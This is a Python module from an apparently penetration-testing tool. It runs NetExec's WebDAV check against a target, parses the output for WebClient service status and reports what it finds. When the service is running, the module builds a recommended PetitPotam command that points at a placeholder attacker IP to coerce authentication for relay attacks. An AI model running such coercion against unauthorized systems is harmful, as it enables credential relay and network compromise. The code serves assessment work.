"""WebDAV/WebClient check."""

import re

from ..core.colors import Colors, c
from ..core.output import JSON_DATA, debug_nxc, output, print_section, status
from ..core.runner import run_nxc
from ..parsing.nxc_output import is_nxc_noise_line
from ..reporting.next_steps import get_external_tool_auth

# Patterns for verbose output parsing
RE_WEBDAV_LINE = re.compile(r"WEBDAV\s+(\S+)\s+(\d+)\s+(\S+)\s+(.*)", re.IGNORECASE)
RE_SERVICE_ENABLED = re.compile(r"WebClient\s+Service\s+enabled\s+on[:\s]*(\S+)", re.IGNORECASE)
RE_SERVICE_STATUS = re.compile(
    r"(?:WebClient|WebDAV)\s+(?:service|status)[:\s]+(\w+)", re.IGNORECASE
)
RE_DAV_RPC = re.compile(r"DAV\s+RPC\s+Service", re.IGNORECASE)
RE_ERROR_MSG = re.compile(r"(?:Error|STATUS)[:\s_]*(\S+)", re.IGNORECASE)
RE_ENDPOINT = re.compile(r"(?:endpoint|pipe|service)[:\s]+([^\s,]+)", re.IGNORECASE)


def parse_webdav_verbose(stdout: str, stderr: str) -> dict:
    """Parse verbose -M webdav output for detailed service info.

    Verbose output may include:
    - WEBDAV <IP> <PORT> <HOST> WebClient Service enabled on: <IP>
    - INFO/DEBUG lines about DAV RPC Service pipe checks
    - Error messages (SessionError, transport errors)
    - Service status details

    Returns dict with:
        - hosts_enabled: list of hosts with WebClient enabled
        - service_details: list of dicts with host, port, hostname, message
        - errors: list of error messages encountered
        - endpoints_checked: list of DAV endpoints/pipes checked
        - info_messages: relevant INFO/DEBUG lines
    """
    verbose_data = {
        "hosts_enabled": [],
        "service_details": [],
        "errors": [],
        "endpoints_checked": [],
        "info_messages": [],
    }

    combined_output = stdout + "\n" + stderr

    for line in combined_output.split("\n"):
        line_stripped = line.strip()
        if not line_stripped:
            continue

        # Parse WEBDAV module output line: WEBDAV <IP> <PORT> <HOST> <message>
        webdav_match = RE_WEBDAV_LINE.match(line_stripped)
        if webdav_match:
            ip, port, hostname, message = webdav_match.groups()
            detail = {"ip": ip, "port": port, "hostname": hostname, "message": message.strip()}
            verbose_data["service_details"].append(detail)

            # Check if this indicates WebClient is enabled
            if RE_SERVICE_ENABLED.search(message) or "enabled" in message.lower():
                if ip not in verbose_data["hosts_enabled"]:
                    verbose_data["hosts_enabled"].append(ip)
            continue

        # Check for "WebClient Service enabled" pattern in any line
        enabled_match = RE_SERVICE_ENABLED.search(line_stripped)
        if enabled_match:
            host = enabled_match.group(1)
            if host not in verbose_data["hosts_enabled"]:
                verbose_data["hosts_enabled"].append(host)
            continue

        # Parse verbose/debug INFO lines
        if (
            "[*]" in line_stripped
            or "INFO" in line_stripped.upper()
            or "DEBUG" in line_stripped.upper()
        ):
            content = line_stripped
            for marker in ["[*]", "[+]", "[-]", "INFO", "DEBUG"]:
                if marker in content.upper():
                    content = content.split(marker, 1)[-1].strip()
                    break

            # Skip DNS resolution errors early (before any keyword matching)
            # These contain "service" in "Name or service not known" which false-matches
            if "name or service not known" in content.lower():
                continue
            if "error resolving hostname" in content.lower():
                continue

            # Check for DAV RPC Service references (indicates endpoint checking)
            if RE_DAV_RPC.search(content):
                verbose_data["endpoints_checked"].append("DAV RPC Service")
                verbose_data["info_messages"].append(content)
                continue

            # Check for endpoint/pipe information
            endpoint_match = RE_ENDPOINT.search(content)
            if endpoint_match:
                endpoint = endpoint_match.group(1)
                if endpoint not in verbose_data["endpoints_checked"]:
                    verbose_data["endpoints_checked"].append(endpoint)
                verbose_data["info_messages"].append(content)
                continue

            # Capture WebClient/WebDAV related INFO messages
            if any(
                kw in content.lower() for kw in ["webclient", "webdav", "dav", "service", "pipe"]
            ):
                verbose_data["info_messages"].append(content)
                continue

        # Parse error messages from verbose/debug output
        if "[-]" in line_stripped or "Error" in line_stripped or "STATUS_" in line_stripped:
            content = line_stripped
            for marker in ["[-]"]:
                if marker in content:
                    content = content.split(marker, 1)[-1].strip()

            # Capture error details
            if any(kw in content.lower() for kw in ["error", "failed", "denied", "status_"]):
                # Skip noise errors not related to webdav
                if any(
                    kw in content.lower() for kw in ["webclient", "webdav", "dav", "pipe", "ipc"]
                ):
                    verbose_data["errors"].append(content)
                elif "Error enumerating WebDAV" in content:
                    verbose_data["errors"].append(content)
                elif "STATUS_OBJECT_NAME_NOT_FOUND" in content:
                    # This specifically means WebClient is NOT running
                    verbose_data["info_messages"].append(
                        "WebClient service not running (DAV RPC pipe not found)"
                    )
                elif "BrokenPipe" in content or "ConnectionReset" in content:
                    verbose_data["errors"].append(f"Transport error: {content}")

    return verbose_data


def enum_webdav(args, cache):
    """Check WebClient service status."""
    target = cache.target if cache else args.target
    print_section("WebDAV/WebClient Check", target)

    auth = cache.auth_args
    status("Checking WebClient service status...")

    webdav_args = ["smb", target] + auth + ["-M", "webdav"]
    rc, stdout, stderr = run_nxc(webdav_args, args.timeout)
    debug_nxc(webdav_args, stdout, stderr, "WebDAV")

    # Parse verbose output for additional service details
    verbose_info = parse_webdav_verbose(stdout, stderr)

    # Build webdav_enabled list from both standard and verbose parsing
    webdav_enabled = list(verbose_info["hosts_enabled"])

    # Fallback to original parsing for backward compatibility
    for line in stdout.split("\n"):
        line = line.strip()
        if not line or is_nxc_noise_line(line):
            continue

        if "WebClient" in line or "WebDAV" in line:
            if "running" in line.lower() or "enabled" in line.lower() or "[+]" in line:
                # Extract hostname from SMB output line if available
                parts = line.split()
                host = target
                if parts and parts[0] == "SMB":
                    # SMB <host> <port> ... format
                    if len(parts) >= 2:
                        host = parts[1]
                elif parts and parts[0].upper() == "WEBDAV":
                    # WEBDAV <host> <port> ... format
                    if len(parts) >= 2:
                        host = parts[1]
                if host not in webdav_enabled:
                    webdav_enabled.append(host)

    # Store verbose info in cache for potential use by other modules
    cache.webdav_enabled = webdav_enabled
    cache.webdav_info = {
        "service_details": verbose_info["service_details"],
        "endpoints_checked": verbose_info["endpoints_checked"],
        "errors": verbose_info["errors"],
    }

    if webdav_enabled:
        status(
            f"WebClient service is {c('RUNNING', Colors.RED)} - coercion attacks possible!",
            "warning",
        )

        # Display service details if available from verbose output
        if verbose_info["service_details"]:
            output("")
            output(c("SERVICE DETAILS:", Colors.CYAN))
            for detail in verbose_info["service_details"]:
                host_info = f"{detail['hostname']} ({detail['ip']}:{detail['port']})"
                output(f"  {host_info}: {detail['message']}")

        # Display checked endpoints if available
        if verbose_info["endpoints_checked"]:
            output("")
            output(c("ENDPOINTS CHECKED:", Colors.CYAN))
            for endpoint in verbose_info["endpoints_checked"]:
                output(f"  {endpoint}")

        # Add coercion recommendation
        # PetitPotam uses impacket-style auth
        impacket_auth = get_external_tool_auth(args, cache, tool="impacket")
        cred_format = impacket_auth["credential_format"]
        auth_flags = impacket_auth["auth_string"]
        if auth_flags:
            petitpotam_cmd = f"PetitPotam.py {auth_flags} {cred_format} <attacker_ip> {target}"
        else:
            petitpotam_cmd = f"PetitPotam.py {cred_format} <attacker_ip> {target}"
        petitpotam_desc = "Coerce authentication via WebDAV for relay attacks"
        if impacket_auth["alt_auth_hint"]:
            petitpotam_desc += impacket_auth["alt_auth_hint"]
        cache.add_next_step(
            finding="WebClient service running",
            command=petitpotam_cmd,
            description=petitpotam_desc,
            priority="high",
        )
    else:
        # Distinguish between "definitely not running" vs "could not determine"
        # Check if we have explicit evidence that service is not running
        explicit_not_running = any(
            "not running" in msg.lower() or "not found" in msg.lower()
            for msg in verbose_info["info_messages"]
        )
        has_errors = len(verbose_info["errors"]) > 0
        has_service_details = len(verbose_info["service_details"]) > 0

        if explicit_not_running or has_service_details:
            status("WebClient service is not running", "info")
        elif has_errors:
            status("Could not determine WebClient service status", "info")
        else:
            status("WebClient service is not running (no response)", "info")

        # Show why it's not running if we have verbose info
        if verbose_info["info_messages"]:
            for msg in verbose_info["info_messages"][:3]:  # Limit to first 3
                output(f"    {msg}")

    # Display any errors encountered during enumeration
    if verbose_info["errors"]:
        output("")
        output(c("ENUMERATION ERRORS:", Colors.YELLOW))
        for error in verbose_info["errors"][:5]:  # Limit to first 5
            output(f"  {error}")

    # Display relevant verbose INFO messages
    if verbose_info["info_messages"] and webdav_enabled:
        output("")
        output(c("VERBOSE INFO:", Colors.CYAN))
        for msg in verbose_info["info_messages"][:5]:  # Limit to first 5
            output(f"  {msg}")

    if args.json_output:
        JSON_DATA["webdav"] = {
            "enabled": bool(webdav_enabled),
            "hosts": webdav_enabled,
            "service_details": verbose_info["service_details"],
            "endpoints_checked": verbose_info["endpoints_checked"],
            "errors": verbose_info["errors"],
            "info_messages": verbose_info["info_messages"],
        }
